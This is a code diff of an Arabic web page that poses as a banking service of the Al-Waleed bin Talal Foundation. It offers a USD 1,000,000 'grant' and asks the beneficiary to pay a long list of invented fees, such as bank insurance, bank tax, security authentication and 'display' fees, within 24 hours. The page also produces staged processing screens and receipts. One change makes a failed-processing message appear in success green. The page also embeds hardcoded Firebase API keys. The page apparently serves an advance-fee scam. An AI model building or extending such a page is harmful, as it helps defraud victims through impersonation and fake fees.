@@ -3,12 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>المملكة القابظة</title>
-    <meta property="og:title" content="حساب مؤسسة الوليد بن طلال">
-    <meta property="og:description" content="كافة الخدمات المصرفيه في بين يديك">
-    <meta property="og:image" content="https://alwaleed-foundation.vercel.app/xx.png">
-    <meta property="og:url" content="https://alwaleed-foundation.vercel.app/">
-    <meta property="og:type" content="website">
+    <title>الخدمات المصرفية </title>
     <link rel="manifest" href="/manifest.json">
     <meta name="theme-color" content="#000000">
     <style>
@@ -426,19 +421,6 @@
             min-width: 0;
             width: 100%
         }
-        .calculated-fee {
-            margin-top: 7px;
-            padding: 7px 11px;
-            color: #1e7a38;
-            background: #eef9f0;
-            border: 1px solid #c5e4ca;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 800;
-            direction: ltr;
-            text-align: left;
-        }
-        body.en .calculated-fee { text-align: right; }
         .via-wrap {
             display: flex;
             flex: 1;
@@ -3840,7 +3822,7 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
             <div class="modal-body" id="finReceiptBody" style="max-height:65vh;overflow-y:auto"></div>
             <div class="modal-footer">
                 <button class="btn btn-outline btn-sm" id="closeFinReceiptBtn">إغلاق</button>
-                <button class="btn btn-secondary btn-sm" id="printFinReceiptBtn">🖨️ طباعة</button>
+                <button class="btn btn-secondary btn-sm" onclick="window.print()">🖨️ طباعة</button>
             </div>
         </div>
     </div>
@@ -4327,65 +4309,49 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                             <span id="currencyFlag">&#127482;&#127480;</span> <span id="currencyCode">USD</span> &#9660;
                                         </button>
                                         <input type="text" class="amount-input" id="amount" value="1,000,000.00"/>
-                                        <div id="feeDisplay" class="calculated-fee" aria-live="polite">USD 0.00</div>
                                     </div>
+                                </div>
+
+                                <div class="form-row">
+                                    <label class="form-label" data-k="lbl-fee-type">نوع الرسوم</label>
+                                    <select class="form-control" id="feeType">
+                                        <option value="transfer" data-ar="رسوم تحويل" data-en="Transfer Fee">رسوم تحويل</option>
+                                        <option value="transfer" data-ar="رسوم التأمين البنكي" data-en="Transfer Fee">رسوم التأمين البنكي</option>
+                                        <option value="transfer" data-ar="رسوم الإيداع المالي" data-en="Transfer Fee">رسوم الإيداع المالي</option>
+                                        <option value="transfer" data-ar="رسوم الضريبه البنكية" data-en="Transfer Fee">رسوم الضريبه البنكية</option>
+                                        <option value="transfer" data-ar="رسوم خدمات المصادقة الأمنية" data-en="Transfer Fee">رسوم خدمات المصادقة الأمنية</option>
+                                        <option value="transfer" data-ar="رسوم المصادقة البنكية" data-en="Transfer Fee">رسوم المصادقة البنكية</option>
+                                        <option value="transfer" data-ar="رسوم الإظهار البنكي" data-en="Transfer Fee">رسوم الإظهار البنكي</option>
+                                        <option value="transfer" data-ar="رسوم خدمات الاعتماد الدولي" data-en="Transfer Fee">رسوم خدمات الاعتماد الدولي</option>
+                                        <option value="transfer" data-ar="رسوم خدمة تفعيل التحويل المباشر" data-en="Transfer Fee">رسوم خدمة تفعيل التحويل المباشر</option>
+                                        <option value="transfer" data-ar="رسوم خدمات التسوية والدمج" data-en="Transfer Fee">رسوم خدمات التسوية والدمج</option>
+                                        <option value="transfer" data-ar="رسوم المقاصة الإلكتروني الموحد" data-en="Transfer Fee">رسوم المقاصة الإلكتروني الموحد</option>
+                                        <option value="transfer" data-ar="رسوم خدمة تفعيل نقل الأموال" data-en="Transfer Fee">رسوم خدمة تفعيل نقل الأموال</option>
+                                        <option value="admin" data-ar="رسوم إدارية" data-en="Admin Fee">رسوم إدارية</option>
+                                        <option value="service" data-ar="رسوم إيداع" data-en="Service Fee">رسوم إيداع</option>
+                                        <option value="service" data-ar="رسوم تأمين" data-en="Service Fee">رسوم تأمين</option>
+                                        <option value="service" data-ar="رسوم خدمة" data-en="Service Fee">رسوم خدمة</option>
+                                        <option value="other" data-ar="أخرى" data-en="Other">أخرى</option>
+                                    </select>
                                 </div>
                             </div>
                         </div>
 
-                <div class="form-card">
-                     <div class="form-card-header" data-k="sec-from">2. قيمة الرسوم</div>
-                     <div class="form-card-body">  
-                        <div class="form-row">
-                            <label class="form-label" data-k="lbl-fee-type">نوع الرسوم</label>
-                            <select class="form-control" id="feeType">
-                                <option value="transfer" data-ar="رسوم تحويل" data-en="Transfer Fee">رسوم تحويل</option>
-                                <option value="insurance" data-ar="رسوم التأمين البنكي" data-en="Bank Insurance Fee">رسوم التأمين البنكي</option>
-                                <option value="deposit" data-ar="رسوم الإيداع المالي" data-en="Financial Deposit Fee">رسوم الإيداع المالي</option>
-                                <option value="tax" data-ar="رسوم الضريبة البنكية" data-en="Bank Tax Fee">رسوم الضريبة البنكية</option>
-                                <option value="security" data-ar="رسوم خدمات المصادقة الأمنية" data-en="Security Authentication Fee">رسوم خدمات المصادقة الأمنية</option>
-                                <option value="bank-auth" data-ar="رسوم المصادقة البنكية" data-en="Bank Authentication Fee">رسوم المصادقة البنكية</option>
-                                <option value="display" data-ar="رسوم الإظهار البنكي" data-en="Bank Display Fee">رسوم الإظهار البنكي</option>
-                                <option value="international" data-ar="رسوم خدمات الاعتماد الدولي" data-en="International Certification Fee">رسوم خدمات الاعتماد الدولي</option>
-                                <option value="direct" data-ar="رسوم خدمة تفعيل التحويل المباشر" data-en="Direct Transfer Activation Fee">رسوم خدمة تفعيل التحويل المباشر</option>
-                                <option value="settlement" data-ar="رسوم خدمات التسوية والدمج" data-en="Settlement and Integration Fee">رسوم خدمات التسوية والدمج</option>
-                                <option value="clearing" data-ar="رسوم المقاصة الإلكتروني الموحد" data-en="Unified Electronic Clearing Fee">رسوم المقاصة الإلكتروني الموحد</option>
-                                <option value="activation" data-ar="رسوم خدمة تفعيل نقل الأموال" data-en="Funds Transfer Activation Fee">رسوم خدمة تفعيل نقل الأموال</option>
-                                <option value="admin" data-ar="رسوم إدارية" data-en="Admin Fee">رسوم إدارية</option>
-                                <option value="service" data-ar="رسوم إيداع" data-en="Deposit Fee">رسوم إيداع</option>
-                                <option value="insurance-service" data-ar="رسوم تأمين" data-en="Insurance Fee">رسوم تأمين</option>
-                                <option value="service-fee" data-ar="رسوم خدمة" data-en="Service Fee">رسوم خدمة</option>
-                                <option value="other" data-ar="أخرى" data-en="Other">أخرى</option>
-                            </select>
-                        </div>
-                        <div class="form-row" id="paidFeeRow">
-                            <label class="form-label" data-k="lbl-paid-fee">الرسوم المدفوعة</label>
-                            <div class="amount-wrap">
-                                <button class="currency-btn paid-fee-currency" id="paidFeeCurrencyBtn">
-                                    <span id="paidFeeCurrencyFlag">&#127482;&#127480;</span>
-                                    <span id="paidFeeCurrencyCode">USD</span> &#9660;
-                                </button>
-                                <input type="text" class="amount-input" id="paidFee" value=""/>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
                         <div class="notice-card">
-                            <div class="notice-title" data-k="sec-notice">4. تفاصيل التحويل</div>
+                            <div class="notice-title" data-k="sec-notice">3. تفاصيل التحويل</div>
                             <div class="notice-body">
                                 <p class="notice-text" data-k="notice-1">يرجى إكمال الإجراءات والتنفيذ خلال 24 ساعة</p>
                                 <p class="notice-text" data-k="notice-2">الموافقة على نظام مراقبة البنوك بالصيغة المرفقة </p>
                                 <p class="notice-text" data-k="notice-3">نظام الإيداعات والتحويلات المالية</p>
                                 <br>
                                 <p class="notice-text" style="font-weight:bold" data-k="notice-acct">بيانات المستفيد</p>
-                                <p class="notice-text"><span data-k="notice-ap-lbl">اسم الحالة التي تم الموافقة:</span> <input class="inline-input" id="approvedName" value="" data-par="اسم المستفيد" data-pen="Beneficiary name" placeholder="اسم المستفيد"/></p>
+                                <p class="notice-text"><span data-k="notice-ap-lbl">اسم الحالة التي تم الموافقة:</span> <input class="inline-input" id="approvedName" value="" placeholder="اسم المستفيد"/></p>
                                 <br>
                                 <p class="notice-text grant-description">
                                     <span data-k="notice-grant">يتم صرف المنحة المقدرة بمبلغ وقدره</span>
                                     <span class="grant-amount-line"><span class="highlight-amount" id="summaryAmount">USD 1,000,000.00</span><span data-k="notice-only"> لاغير</span></span>
                                 </p>
-                                <p class="notice-text"><span data-k="notice-dep">المالية إيداع المنحة بعد استكمال ما تم التوجيه به للمستفيد:</span> <input class="inline-input" id="finalBeneficiary" value="" data-par="اسم المستفيد" data-pen="Beneficiary name" placeholder="اسم المستفيد"/></p>
+                                <p class="notice-text"><span data-k="notice-dep">المالية إيداع المنحة بعد استكمال ما تم التوجيه به للمستفيد:</span> <input class="inline-input" id="finalBeneficiary" value="" placeholder="اسم المستفيد"/></p>
                                 <div class="terms-row">
                                     <input type="checkbox" id="termsCheck">
                                     <label for="termsCheck" style="cursor:pointer"><span data-k="terms-text">لقد قرأت وافقت على</span> <span class="terms-link" data-k="terms-link">الشروط والأحكام الخاصة</span></label>
@@ -4396,18 +4362,29 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                             <button class="btn btn-primary" id="continueBtn" data-k="btn-continue">متابعة &larr;</button>
                             <button class="btn btn-cancel" id="cancelBtn" data-k="btn-cancel">إلغاء</button>
                         </div>
+                        
 
-                        <div class="form-row fee-rate-row" style="margin-top:4px;align-items:flex-start">
-                            <label class="form-label" data-k="lbl-fee-rate">نسبة رسوم التحويل</label>
-                            <div style="flex:1;min-width:0">
-                                <div class="amount-wrap">
-                                    <button class="currency-btn flat" style="cursor:default">%</button>
-                                    <input type="text" inputmode="decimal" class="amount-input" id="feeRate" value="10.00" aria-describedby="feeDisplay"/>
-                                </div>
+                        <div class="form-row" style="margin-top:4px">
+                            <label class="form-label" data-k="lbl-fee-manual">رسوم التحويل <span class="required">*</span></label>
+                            <div class="amount-wrap">
+                                <button class="currency-btn flat" style="cursor:default"><span id="feeCurrencyFlag">&#127482;&#127480;</span> <span id="feeCurrencyCode">USD</span></button>
+                                <input type="text" class="amount-input" id="manualFee" value="0.00"/>
+                            </div>
+                        </div>
+                        
+
+                        <div class="form-row" id="paidFeeRow">
+                            <label class="form-label" data-k="lbl-paid-fee">الرسوم المدفوعة</label>
+                            <div class="amount-wrap">
+                                <button class="currency-btn paid-fee-currency" id="paidFeeCurrencyBtn">
+                                    <span id="paidFeeCurrencyFlag">&#127482;&#127480;</span>
+                                    <span id="paidFeeCurrencyCode">USD</span> &#9660;
+                                </button>
+                                <input type="text" class="amount-input" id="paidFee" value=""/>
                             </div>
                         </div>
 
-                        <button id="toggleKeyboardBtn" data-k="toggle-keyboard" onclick="toggleTabletKeyboard()">إظهار كيبورد التابلت</button>
+                        <button id="toggleKeyboardBtn" onclick="toggleTabletKeyboard()">إظهار كيبورد التابلت</button>
                     </div>
 
                     <!-- SCREEN 2 -->
@@ -4739,7 +4716,7 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                 'lbl-from': ['من حساب', 'From Account'],
                                 'lbl-amount': ['المبلغ', 'Amount'],
                                 'fee-label': ['رسوم التحويل:', 'Transfer Fee:'],
-                                'lbl-fee-rate': ['نسبة رسوم التحويل', 'Transfer Fee Rate'],
+                                'lbl-fee-manual': ['رسوم التحويل', 'Transfer Fee'],
                                 'lbl-fee-type': ['نوع الرسوم', 'Fee Type'],
                                 'lbl-paid-fee': ['الرسوم المدفوعة', 'Paid Fees'],
                                 'sec-to': ['2. إلى', '2. To'],
@@ -4771,7 +4748,7 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                 'btn-print': ['طباعة', 'Print'],
                                 'btn-clear': ['مسح السجل', 'Clear History'],
                                 'confirm-hdr': ['مراجعة وتأكيد بيانات التحويل', 'Review & Confirm Transfer'],
-                                'lbl-fees': ['رسوم التحويل', 'Transfer Fee'],
+                                'lbl-fees': ['رسوم التحويل)', 'Transfer Fee)'],
                                 'lbl-total': ['الإجمالي', 'Total'],
                                 'lbl-currency': ['العملة', 'Currency'],
                                 'lbl-date': ['تاريخ التنفيذ', 'Execution Date'],
@@ -4826,8 +4803,6 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                 'new-ready': ['يمكنك بدء تحويل جديد', 'You can start a new transfer'],
                                 'hist-cleared': ['تم مسح سجل التحويلات', 'History cleared'],
                                 'proc-fail-msg': ['اكتملت المعالجة — توجد مشكلة تحتاج مراجعتك', 'Processing complete — issue detected'],
-                                'print-popup-blocked': ['يرجى السماح بالنوافذ المنبثقة لطباعة الإيصال', 'Please allow pop-ups to print the receipt'],
-                                'toggle-keyboard': ['إظهار كيبورد التابلت', 'Show tablet keyboard'],
                             };
 
                             var PS_MSGS_AR = ['جاري التحقق من هوية المستخدم...', 'جاري التحقق من رصيد الحساب...', 'جاري الاتصال بنظام التحويل البنكي...', 'جاري التحقق من رسوم معاملة التحويل...', 'جاري إرسال الطلب...'];
@@ -5345,23 +5320,9 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                 return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                             }
 
-                            function getFeeRate() {
-                                var el = document.getElementById('feeRate');
-                                var rate = el ? parseFloat((el.value || '').replace(/,/g, '')) : 0;
-                                return Math.min(100, Math.max(0, isFinite(rate) ? rate : 0));
-                            }
-
                             function getCalculatedFee() {
-                                return getRawAmount() * getFeeRate() / 100;
-                            }
-
-                            function formatNumericInput(el, maxDecimals) {
-                                if (!el) return;
-                                var raw = el.value.replace(/[^0-9.]/g, '');
-                                var parts = raw.split('.');
-                                parts[0] = parts[0].replace(/^0+(?=\d)/, '').replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-                                var decimals = (parts[1] || '').substring(0, maxDecimals || 2);
-                                el.value = parts.length > 1 ? parts[0] + '.' + decimals : parts[0];
+                                var v = document.getElementById('manualFee').value.replace(/,/g, '');
+                                return parseFloat(v) || 0;
                             }
 
                             function playClickSound() {
@@ -5374,7 +5335,6 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                 var amt = getRawAmount();
                                 var fee = getCalculatedFee();
                                 var code = selectedCurrency.code;
-                                var feeRate = getFeeRate();
                                 var paidFeeVal = parseFloat(document.getElementById('paidFee').value.replace(/,/g, '')) || 0;
                                 var paidCode = selectedPaidFeeCurrency.code;
 
@@ -5384,12 +5344,8 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                 var feeCode = document.getElementById('feeCurrencyCode');
                                 if (feeFlag) feeFlag.textContent = selectedCurrency.flag;
                                 if (feeCode) feeCode.textContent = code;
-                                if (feeEl) feeEl.textContent = code + ' ' + fmtNum(fee) + ' (' + fmtNum(feeRate) + '%)';
+                                if (feeEl) feeEl.textContent = code + ' ' + fmtNum(fee);
                                 if (sumEl) sumEl.textContent = code + ' ' + fmtNum(amt);
-                                var feeRateEl = document.getElementById('feeRate');
-                                if (feeRateEl && document.activeElement !== feeRateEl) feeRateEl.value = feeRate.toFixed(2);
-                                var feeDisplay = document.getElementById('feeDisplay');
-                                if (feeDisplay) feeDisplay.textContent = code + ' ' + fmtNum(fee) + ' (' + fmtNum(feeRate) + '%)';
 
                                 var pfFlag = document.getElementById('paidFeeCurrencyFlag');
                                 var pfCode = document.getElementById('paidFeeCurrencyCode');
@@ -5457,51 +5413,11 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                     ' مرام مراد فهد',
                                     'أيمن سعد',
                                     'باسل ناصر',
-                                    'صالح وليد',
-                                    'نايف عادل',
-                                    'رائد محمد',
-                                    'ياسر عبدالله',
-                                    'منصور علي',
-                                    'جابر حسن',
-                                    'جمال يوسف',
-                                    'كريم فهد',
                                     'رامي خالد',
                                     'سعد إبراهيم',
-                                    'حسين عمر',
-                                    'مروان صالح',
-                                    'أنس أحمد',
-                                    'حازم ناصر',
-                                    'عماد سالم',
-                                    'فراس محمود',
-                                    'فواز راشد',
-                                    'سيف وليد',
-                                    'معاذ منصور',
-                                    'نواف حمد',
-                                    'عيسى سعد',
-                                    'تميم علي',
                                     'زاهر حسن',
                                     'إياد يوسف',
                                     'حسان فهد',
-                                    'نبيل خالد',
-                                    'سارة علي',
-                                    'نورة صالح',
-                                    'ريم حسن',
-                                    'ليان سعد',
-                                    'هند عبدالله',
-                                    'مريم خالد',
-                                    'لينا أحمد',
-                                    'أمل يوسف',
-                                    'جود فهد',
-                                    'لمى ناصر',
-                                    'رنا محمد',
-                                    'عبير سالم',
-                                    'شهد وليد',
-                                    'دانا عمر',
-                                    'خلود منصور',
-                                    'وفاء علي',
-                                    'غادة سعد',
-                                    'سمية حسن',
-                                    'بسمة إبراهيم',
                                     'نجلاء راشد',
                                     'رغد فهد',
                                     'شذى خالد',
@@ -5927,8 +5843,8 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                             setTimeout(goToStep5, 900);
                                         } else {
                                             title.textContent = tr('proc-fail-msg');
-                                            title.style.color = '#cc2020';
-                                            bar.style.background = '#cc2020';
+                                            title.style.color = '#2e7d32';
+                                            bar.style.background = '#2e7d32';
                                             bar.style.width = '100%';
                                             setTimeout(goToStep5, 900);
                                         }
@@ -6089,27 +6005,14 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                             // ===================================================
                             // PRINT
                             // ===================================================
-                            function printDetachedReceipt(body, title) {
-                                var dir = isEN ? 'ltr' : 'rtl';
-                                var w = window.open('', 'receipt-print', 'width=700,height=900,noopener,noreferrer');
-                                if (!w) { showToast(tr('print-popup-blocked'), 'error'); return; }
-                                var css = 'body{font-family:Arial,sans-serif;direction:' + dir + ';padding:24px;color:#102a43;background:#fff}.receipt-row{display:flex;justify-content:space-between;gap:18px;padding:9px 0;border-bottom:1px dashed #ddd;font-size:15px}.receipt-status-ok{background:#e8f5e9;color:#2e7d32;padding:8px;border-radius:4px;text-align:center;margin:12px 0;font-weight:bold}.receipt-status-fail{background:#ffebee;color:#cc2020;padding:8px;border-radius:4px;text-align:center;margin:12px 0;font-weight:bold}@media print{body{padding:0}}';
-                                w.document.open();
-                                w.document.write('<!DOCTYPE html><html lang="' + (isEN ? 'en' : 'ar') + '" dir="' + dir + '"><head><meta charset="UTF-8"><title>' + title + '</title><style>' + css + '</style></head><body>' + body + '</body></html>');
-                                w.document.close();
-                                w.onload = function() { w.focus(); w.print(); setTimeout(function() { w.close(); }, 250); };
-                            }
-
                             function printReceipt() {
-                                var receipt = document.getElementById('receiptBody');
-                                if (!receipt) return;
-                                printDetachedReceipt(receipt.innerHTML, isEN ? 'Transaction Receipt' : 'إيصال العملية');
-                            }
-
-                            function printFinanceReceipt() {
-                                var receipt = document.getElementById('finReceiptBody');
-                                if (!receipt) return;
-                                printDetachedReceipt(receipt.innerHTML, isEN ? 'Finance Application Receipt' : 'إيصال طلب التمويل');
+                                var body = document.getElementById('receiptBody').innerHTML;
+                                var dir = isEN ? 'ltr' : 'rtl';
+                                var w = window.open('', '', 'width=500,height=700');
+                                if (!w) return;
+                                w.document.write('<!DOCTYPE html><html><head><title>Receipt</title><style>body{font-family:Arial,sans-serif;direction:' + dir + ';padding:20px}.receipt-row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px dashed #ddd;font-size:15px}.receipt-status-ok{background:#e8f5e9;color:#2e7d32;padding:6px;border-radius:4px;text-align:center;margin:10px 0;font-weight:bold}.receipt-status-fail{background:#ffebee;color:#cc2020;padding:6px;border-radius:4px;text-align:center;margin:10px 0;font-weight:bold}</style></head><body>' + body + '</body></html>');
+                                w.document.close();
+                                w.print();
                             }
 
                             // ===================================================
@@ -6176,24 +6079,19 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
                                 document.getElementById('closeCurrencyBtn').addEventListener('click', function() { closeModal('currencyModal'); });
 
                                 document.getElementById('amount').addEventListener('input', function() {
-                                    formatNumericInput(this, 2);
+                                    var raw = this.value.replace(/[^0-9.]/g, '');
+                                    var parts = raw.split('.');
+                                    parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+                                    this.value = parts.length > 1 ? parts[0] + '.' + parts[1] : parts[0];
                                     updateSummary();
                                 });
-                                var savedFeeRate = secureStorage.get('transfer_fee_rate', 10);
-                                var feeRateInput = document.getElementById('feeRate');
-                                if (feeRateInput) {
-                                    feeRateInput.value = Math.min(100, Math.max(0, Number(savedFeeRate) || 10)).toFixed(2);
-                                    feeRateInput.addEventListener('input', function() {
-                                        formatNumericInput(this, 2);
-                                        secureStorage.set('transfer_fee_rate', getFeeRate());
-                                        updateSummary();
-                                    });
-                                    feeRateInput.addEventListener('blur', function() {
-                                        this.value = getFeeRate().toFixed(2);
-                                        secureStorage.set('transfer_fee_rate', getFeeRate());
-                                        updateSummary();
-                                    });
-                                }
+                                document.getElementById('manualFee').addEventListener('input', function() {
+                                    var raw = this.value.replace(/[^0-9.]/g, '');
+                                    var parts = raw.split('.');
+                                    parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+                                    this.value = parts.length > 1 ? parts[0] + '.' + parts[1] : parts[0];
+                                    updateSummary();
+                                });
                                 document.getElementById('paidFee').addEventListener('input', function() {
                                     var raw = this.value.replace(/[^0-9.]/g, '');
                                     var parts = raw.split('.');
@@ -6258,8 +6156,6 @@ body.dark-mode .operation-currency-row { border-bottom-color: rgba(151,185,211,.
 
                                 document.getElementById('closeReceiptBtn').addEventListener('click', function() { closeModal('receiptModal'); });
                                 document.getElementById('printReceiptBtn').addEventListener('click', printReceipt);
-                                document.getElementById('printFinReceiptBtn').addEventListener('click', printFinanceReceipt);
-                                document.getElementById('closeFinReceiptBtn').addEventListener('click', function() { closeModal('finReceiptModal'); });
 
                                 ['currencyModal', 'addBenModal', 'errorModal', 'receiptModal', 'finRequestModal', 'finReceiptModal'].forEach(function(id) {
                                     document.getElementById(id).addEventListener('click', function(e) {
@@ -6598,13 +6494,13 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import { getDatabase, ref, push, set, get, remove } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyDeg6RBNC9bWw1QYxBkYtCuMMFPBzxpw4o",
-  authDomain: "studio-6422025604-b97aa.firebaseapp.com",
-  projectId: "studio-6422025604-b97aa",
-  storageBucket: "studio-6422025604-b97aa.firebasestorage.app",
-  messagingSenderId: "599267399266",
-  appId: "1:599267399266:web:329e49e24298af60f5e33b",
-  measurementId: "G-0X51R030QL"
+    apiKey: "AIzaSyCYxmV9J0KtnuMv1l8U5nJu-dqj6gLYujo",
+    authDomain: "waleed-d28f4.firebaseapp.com",
+    databaseURL: "https://waleed-d28f4-default-rtdb.firebaseio.com",
+    projectId: "waleed-d28f4",
+    storageBucket: "waleed-d28f4.firebasestorage.app",
+    messagingSenderId: "590481084112",
+    appId: "1:590481084112:web:ed21ebb3e31fa3510358d5"
 };
 
 const app = initializeApp(firebaseConfig);
